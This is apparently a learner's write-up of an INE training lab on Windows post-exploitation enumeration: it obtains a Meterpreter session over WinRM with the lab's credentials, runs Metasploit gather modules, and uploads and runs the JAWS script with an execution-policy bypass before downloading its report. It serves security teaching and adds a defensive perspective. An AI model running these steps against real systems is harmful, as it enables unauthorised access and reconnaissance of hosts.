# INE Lab: Automating Windows Local Enumeration

## 📌 Lab Overview

This lab focuses on **automating local enumeration on a Windows target** after gaining access through WinRM.

Instead of manually running many Windows commands, we use:

- Metasploit post-exploitation modules
- PowerShell enumeration
- JAWS (Just Another Windows Enumeration Script)

The goal is to collect information useful for understanding the target and identifying potential privilege-escalation opportunities.

---

## 🧭 Lab Flow

```text
Target Discovery
      ↓
Nmap Service Enumeration
      ↓
WinRM Access
      ↓
Meterpreter Session
      ↓
Automated Metasploit Enumeration
      ↓
JAWS PowerShell Enumeration
      ↓
Download & Analyze Results
```

---

# 1. Check Target Connectivity

First, verify that the target machine is reachable.

```bash
ping -c 4 demo.ine.local
```

### What it does

- `ping` sends ICMP echo requests.
- `-c 4` sends four packets.
- `demo.ine.local` is the target hostname.

A successful response confirms network connectivity to the lab target.

### SOC Perspective

Connectivity checks help establish whether a host is reachable before performing further investigation or enumeration.

---

# 2. Scan the Target with Nmap

Perform service and version detection against the WinRM port.

```bash
nmap -sV -p 5985 demo.ine.local
```

### What it does

- `-sV` attempts to identify the service and version.
- `-p 5985` scans TCP port 5985.
- Port **5985** is commonly used by **Windows Remote Management (WinRM)** over HTTP.

The lab identifies the service as:

```text
5985/tcp open  http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### Why this matters

Finding WinRM tells us that the Windows system exposes a remote-management interface that can potentially be used for authenticated access.

---

# 3. Start Metasploit

Launch the Metasploit Framework console.

```bash
msfconsole
```

Metasploit provides modules for exploitation, post-exploitation, enumeration, and other security-testing activities.

---

# 4. Load the WinRM Script Execution Module

Use the WinRM-based Metasploit module.

```text
use exploit/windows/winrm/winrm_script_exec
```

### What it does

This module uses Windows Remote Management to execute a payload on the target after successful authentication.

---

# 5. Configure the Target

Set the target host.

```text
set RHOSTS demo.ine.local
```

### Explanation

`RHOSTS` specifies the remote target that Metasploit should connect to.

---

# 6. Configure Authentication

Set the supplied lab username:

```text
set USERNAME administrator
```

Set the supplied lab password:

```text
set PASSWORD tinkerbell
```

These credentials are provided by the INE lab environment.

---

# 7. Configure FORCE_VBS

Set:

```text
set FORCE_VBS false
```

This configures whether the module should force the use of a VBScript execution method.

---

# 8. Execute the Module

Run the module:

```text
run
```

The module authenticates to WinRM and executes the configured payload.

A successful execution provides a **Meterpreter session**.

The lab output also shows that the session is migrated to a system-level process:

```text
Successfully migrated to svchost.exe
NT AUTHORITY\SYSTEM
```

### Important Concept

Getting a Meterpreter session and obtaining **SYSTEM-level execution** are separate concepts.

The session provides access, while the process context determines the privileges available to that session.

---

# 9. Background the Meterpreter Session

Move the active session into the background:

```text
background
```

The session remains active while we work with Metasploit post-exploitation modules.

---

# 10. Enumerate Windows Privileges

Load the Windows privilege enumeration module:

```text
use post/windows/gather/win_privs
```

Set the active session:

```text
set SESSION 1
```

Run it:

```text
run
```

### What it enumerates

The module reports information such as:

- Current user
- Whether the user is an administrator
- Whether the user is SYSTEM
- UAC status
- Windows privileges

Example:

```text
Is Admin      True
Is System     True
UAC Enabled   False
UID            NT AUTHORITY\SYSTEM
```

### SOC Perspective

Privilege information helps determine the impact of a compromised session and whether an attacker has obtained elevated access.

---

# 11. Enumerate Logged-On Users

Load:

```text
use post/windows/gather/enum_logged_on_users
```

Set the session:

```text
set SESSION 1
```

Run:

```text
run
```

### What it provides

The module identifies:

- Currently logged-on users
- Security Identifiers (SIDs)
- Recently logged-on user profiles

### SOC Perspective

Logged-on user information can help establish **who was using the system** during suspicious activity.

---

# 12. Check Whether the Target Is a Virtual Machine

Load:

```text
use post/windows/gather/checkvm
```

Set the session:

```text
set SESSION 1
```

Run:

```text
run
```

The lab output identifies whether the target is running inside a virtualized environment.

### Why it matters

Virtualization information can provide useful context during incident investigation and environment identification.

---

# 13. Enumerate Installed Applications

Load:

```text
use post/windows/gather/enum_applications
```

Set the session:

```text
set SESSION 1
```

Run:

```text
run
```

### What it collects

The module enumerates installed software and versions.

Example results include:

```text
AWS PV Drivers
AWS Tools for Windows
Amazon SSM Agent
amazon-ssm-agent
aws-cfn-bootstrap
```

### SOC Perspective

Installed applications can reveal:

- Security tools
- Remote-access software
- Management agents
- Potentially vulnerable software
- Software commonly associated with cloud environments

---

# 14. Enumerate Domain/Computer Information

Load:

```text
use post/windows/gather/enum_computers
```

Set the session:

```text
set SESSION 1
```

Run:

```text
run
```

The module attempts to determine whether the system is part of a Windows domain and gather related computer information.

The lab output indicates that the target is **not part of a Windows domain**.

---

# 15. Enumerate Installed Windows Patches

Load:

```text
use post/windows/gather/enum_patches
```

Set the session:

```text
set SESSION 1
```

Run:

```text
run
```

### What it collects

The module lists installed Windows updates and their installation dates.

Example:

```text
HotFix ID     Install Date
KB4470502     12/12/2018
KB4470788     12/12/2018
KB4480056     1/9/2019
...
```

### SOC / Security Perspective

Patch information helps determine the security state of a Windows host.

During vulnerability assessment, old or missing patches may indicate potential attack paths.

---

# 16. JAWS – Just Another Windows Enumeration Script

The lab then introduces **JAWS**, a PowerShell-based Windows enumeration script.

JAWS automates the collection of information that could otherwise require many individual commands.

It is designed for penetration-testing and CTF environments and focuses on information useful for identifying potential privilege-escalation opportunities.

Repository:

```text
https://github.com/411Hall/JAWS
```

---

# 17. Create the JAWS Script on Kali

Open a text editor and save the JAWS PowerShell script as:

```text
jaws-enum.ps1
```

The lab places the file on the Kali desktop:

```text
/root/Desktop/jaws-enum.ps1
```

The script contains multiple enumeration functions covering areas such as:

- User information
- Processes
- Services
- Scheduled tasks
- Installed software
- File system information
- Privilege-escalation checks

---

# 18. Return to the Meterpreter Session

Interact with the Meterpreter session:

```text
sessions -i 1
```

Move to the Windows C: drive:

```text
cd C:\
```

Create a temporary directory:

```text
mkdir temp
```

Enter the directory:

```text
cd temp
```

---

# 19. Upload the JAWS Script

Upload the PowerShell script from Kali:

```text
upload /root/Desktop/jaws-enum.ps1
```

The file is transferred to the Windows target.

Verify that the upload completes successfully before continuing.

---

# 20. Open a Windows Shell

From Meterpreter:

```text
shell
```

This creates a Windows command shell on the target.

---

# 21. Execute JAWS

Run the script with PowerShell:

```cmd
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

### Breakdown

| Option | Meaning |
|---|---|
| `powershell.exe` | Starts PowerShell |
| `-ExecutionPolicy Bypass` | Bypasses the current PowerShell execution-policy restriction for this execution |
| `-File` | Executes the specified PowerShell script |
| `.\jaws-enum.ps1` | JAWS script in the current directory |
| `-OutputFilename` | Specifies the output file |
| `JAWS-Enum.txt` | Enumeration results file |

### What JAWS performs

The script automatically gathers information such as:

```text
User Information
Processes, Services and Scheduled Tasks
Installed Software
File System Information
Simple Privilege Escalation Methods
```

The enumeration can take a few minutes.

---

# 22. Download the Enumeration Results

After JAWS completes, return to Meterpreter if necessary and download the generated report:

```text
download JAWS-Enum.txt
```

The output is saved on the Kali system.

Example:

```text
/root/JAWS-Enum.txt
```

---

# 23. Analyze the JAWS Report

Open the downloaded file on Kali.

The report contains information about the Windows target, including details such as:

- Windows version
- Architecture
- Hostname
- Current user
- User accounts
- Group memberships
- Network information
- Processes
- Services
- Scheduled tasks
- Installed applications
- File-system information
- Potential privilege-escalation findings

Example information from the lab:

```text
Windows Version: Microsoft Windows Server 2019 Datacenter
Architecture: AMD64
Hostname: SERVER
Current User: SERVER
```

It also enumerates multiple Windows accounts and their group memberships.

---

# 🧠 Why Automated Enumeration Matters

Manual enumeration requires running many commands individually.

For example:

```text
whoami
tasklist
net user
net localgroup
sc query
schtasks
systeminfo
wmic
```

JAWS combines many enumeration techniques into a single automated workflow.

This makes it easier to collect a broad snapshot of the target system.

---

# 🔵 SOC Analyst Perspective

Although this lab is performed from a penetration-testing perspective, the same information is extremely valuable for defensive analysis.

A SOC analyst may investigate:

### 👤 Identity

- Which user was logged in?
- Was the account privileged?
- Were unexpected accounts present?

### ⚙️ Processes & Services

- Which processes were running?
- Which services launched them?
- Are there suspicious binaries or services?

### 🕒 Scheduled Tasks

- Are there unexpected scheduled tasks?
- Do they execute scripts or unusual binaries?

### 📦 Software

- What applications are installed?
- Are vulnerable or unauthorized applications present?

### 🩹 Patch Status

- Is the system missing important security updates?
- Does the software inventory explain a known vulnerability?

### 🔐 Privileges

- Is the process running as Administrator or SYSTEM?
- Which Windows privileges are available?

The key SOC skill is **connecting these individual pieces of evidence into one endpoint story**.

---

# 🧩 Key Commands Cheat Sheet

| Command | Purpose |
|---|---|
| `ping -c 4 demo.ine.local` | Check connectivity |
| `nmap -sV -p 5985 demo.ine.local` | Identify WinRM service |
| `msfconsole` | Start Metasploit |
| `use exploit/windows/winrm/winrm_script_exec` | Load WinRM execution module |
| `set RHOSTS demo.ine.local` | Set target |
| `set USERNAME administrator` | Set username |
| `set PASSWORD tinkerbell` | Set password |
| `run` | Execute module |
| `background` | Background Meterpreter session |
| `use post/windows/gather/win_privs` | Enumerate privileges |
| `use post/windows/gather/enum_logged_on_users` | Enumerate logged-on users |
| `use post/windows/gather/checkvm` | Detect virtualization |
| `use post/windows/gather/enum_applications` | Enumerate applications |
| `use post/windows/gather/enum_computers` | Enumerate computer/domain information |
| `use post/windows/gather/enum_patches` | Enumerate Windows patches |
| `sessions -i 1` | Interact with session |
| `cd C:\` | Change directory |
| `mkdir temp` | Create directory |
| `upload /root/Desktop/jaws-enum.ps1` | Upload JAWS |
| `shell` | Open Windows shell |
| `download JAWS-Enum.txt` | Download results |

---

# 🎯 Key Takeaways

1. **WinRM can provide authenticated remote access to Windows systems.**
2. **Meterpreter post-exploitation modules can automate targeted enumeration.**
3. **Privilege enumeration determines the level of access obtained.**
4. **Logged-on users provide useful identity context.**
5. **Application and patch enumeration help identify security weaknesses.**
6. **JAWS automates large amounts of Windows local enumeration.**
7. **Automated enumeration is useful for both offensive security and defensive investigation.**
8. **SOC analysts should learn to correlate users, processes, services, software, privileges, and persistence mechanisms.**

---

# 🏁 Conclusion

In this lab, I practiced automating Windows local enumeration using **Metasploit post-exploitation modules** and the **JAWS PowerShell enumeration script**.

The biggest takeaway is that enumeration is not simply about collecting commands and output. The real value comes from **correlating the collected information** to understand the security posture and activity of a Windows endpoint.

For SOC analysis, this same mindset can be applied to investigate suspicious processes, privileged accounts, services, scheduled tasks, installed software, and potential persistence mechanisms.
